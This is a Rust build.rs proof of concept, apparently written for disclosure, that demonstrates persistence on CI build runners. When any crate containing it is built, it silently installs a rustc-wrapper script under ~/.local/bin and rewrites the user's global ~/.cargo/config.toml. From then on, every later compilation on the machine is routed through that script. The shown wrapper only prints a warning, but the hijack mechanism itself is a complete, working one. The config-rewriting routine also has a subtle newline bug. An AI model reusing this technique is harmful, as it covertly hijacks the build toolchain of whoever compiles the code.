// build.rs
// Runner-persistence PoC (safe, reversible).
// - Installs ~/.local/bin/rustc-wrapper (outside ~/.cargo so rust-cache won't wipe it)
// - Fixes ~/.cargo/config.toml idempotently (no duplicate [build] tables)
// - Sets build.rustc-wrapper to the installed wrapper
// - Prints a warning on every compiler invocation, then execs the real compiler
// No secrets, no network, non-destructive.

use std::{
    env, fs,
    fs::OpenOptions,
    io::{Read, Write},
    os::unix::fs::PermissionsExt,
    path::PathBuf,
};

fn make_exec(p: &PathBuf) {
    if let Ok(meta) = fs::metadata(p) {
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(p, perms);
    }
}

/// Return a new ~/.cargo/config.toml content that:
/// - keeps all non-[build] content as-is,
/// - collapses multiple [build] tables into one,
/// - sets (or replaces) rustc-wrapper = "<wrapper_path>" inside [build].
fn rewrite_cargo_config(mut existing: String, wrapper_path: &str) -> String {
    let mut lines = existing.lines();
    let mut before_build = String::new();
    let mut build_body = String::new();
    let mut after_first_build = String::new();

    // States: 0 = before any [build], 1 = in first [build], 2 = after first [build]
    let mut state = 0u8;

    while let Some(line) = lines.next() {
        let trimmed = line.trim_start();
        let is_header = trimmed.starts_with('[') && trimmed.ends_with(']');
        if is_header {
            if trimmed == "[build]" {
                // Encounter a [build]
                if state == 0 {
                    state = 1; // enter first build
                    continue;  // don't keep this header here; we'll re-emit later
                } else {
                    // any subsequent [build] is dropped; switch to "after" and skip header
                    state = 2;
                    continue;
                }
            } else {
                // other header starts: switch state appropriately
                match state {
                    0 => before_build.push_str(line),
                    1 => {
                        // leaving first [build]
                        state = 2;
                        after_first_build.push_str(line);
                    }
                    _ => after_first_build.push_str(line),
                }
                after_first_build.push('\n');
                continue;
            }
        }

        // non-header line
        match state {
            0 => {
                before_build.push_str(line);
                before_build.push('\n');
            }
            1 => {
                build_body.push_str(line);
                build_body.push('\n');
            }
            _ => {
                after_first_build.push_str(line);
                after_first_build.push('\n');
            }
        }
    }

    // Normalize build_body: remove existing rustc-wrapper lines within the build table
    let mut new_build_body = String::new();
    for l in build_body.lines() {
        let lt = l.trim_start();
        if lt.starts_with("rustc-wrapper") {
            // drop old setting
            continue;
        }
        new_build_body.push_str(l);
        new_build_body.push('\n');
    }
    // Ensure ends with exactly one newline
    if !new_build_body.ends_with('\n') {
        new_build_body.push('\n');
    }
    // Append our setting
    new_build_body.push_str(&format!(
        r#"rustc-wrapper = "{}""#,
        wrapper_path
    ));
    new_build_body.push('\n');

    // Rebuild config: before + single [build] + body + after
    let mut out = String::new();
    out.push_str(before_build.trim_end());
    out.push('\n');
    out.push_str("[build]\n");
    out.push_str(&new_build_body);
    out.push_str(after_first_build.trim_start());
    if !out.ends_with('\n') {
        out.push('\n');
    }
    out
}

fn main() {
    // Paths
    let home = env::var("HOME").unwrap_or_default();
    let cargo_dir = PathBuf::from(format!("{home}/.cargo"));
    let config_path = cargo_dir.join("config.toml");

    // Wrapper lives outside rust-cache paths
    let local_bin = PathBuf::from(format!("{home}/.local/bin"));
    let wrapper_path = local_bin.join("rustc-wrapper");
    let wrapper_path_str = wrapper_path.display().to_string();
    let marker_path = cargo_dir.join("SAFE_POC_MARKER.txt");

    // Ensure dirs exist
    let _ = fs::create_dir_all(&local_bin);

    // 0) Harmless marker (prove persistence)
    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&marker_path)
    {
        Ok(mut f) => {
            let _ = f.write_all(
                format!(
                    "SAFE_POC_MARKER: runner kept state if this persists.\n\
                     Path: {:?}\n",
                    marker_path
                )
                .as_bytes(),
            );
            println!(
                "cargo:warning=SAFE_PERSISTENCE: wrote marker at {:?}",
                marker_path
            );
        }
        Err(e) => println!("cargo:warning=SAFE_PERSISTENCE: marker write failed: {}", e),
    }

    // 1) Write rustc-wrapper (correct contract)
    let wrapper_script = r#"#!/usr/bin/env bash
# RUNNER_PERSIST_POC rustc-wrapper (non-cached path)
real="$1"; shift
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== real: ${real##*/} args: $* (safe: no secrets, no network)" 1>&2
exec "$real" "$@"
"#;

    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&wrapper_path)
    {
        Ok(mut f) => {
            if let Err(e) = f.write_all(wrapper_script.as_bytes()) {
                println!(
                    "cargo:warning=PoC: failed writing wrapper {:?}: {}",
                    wrapper_path, e
                );
                return;
            }
            make_exec(&wrapper_path);
            println!(
                "cargo:warning=PoC: wrote rustc-wrapper at {:?}",
                wrapper_path
            );
        }
        Err(e) => {
            println!(
                "cargo:warning=PoC: cannot open wrapper path {:?}: {}",
                wrapper_path, e
            );
            return;
        }
    }

    // 2) Fix and set ~/.cargo/config.toml (no duplicate [build])
    let new_content = match fs::read_to_string(&config_path) {
        Ok(existing) => rewrite_cargo_config(existing, &wrapper_path_str),
        Err(_) => {
            // create fresh with a single [build]
            format!("[build]\nrustc-wrapper = \"{}\"\n", wrapper_path_str)
        }
    };

    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&config_path)
    {
        Ok(mut f) => {
            if let Err(e) = f.write_all(new_content.as_bytes()) {
                println!(
                    "cargo:warning=PoC: failed writing {:?}: {}",
                    config_path, e
                );
            } else {
                println!(
                    "cargo:warning=PoC: configured rustc-wrapper in {:?}",
                    config_path
                );
            }
        }
        Err(e) => println!("cargo:warning=PoC: cannot open {:?}: {}", config_path, e),
    }
}
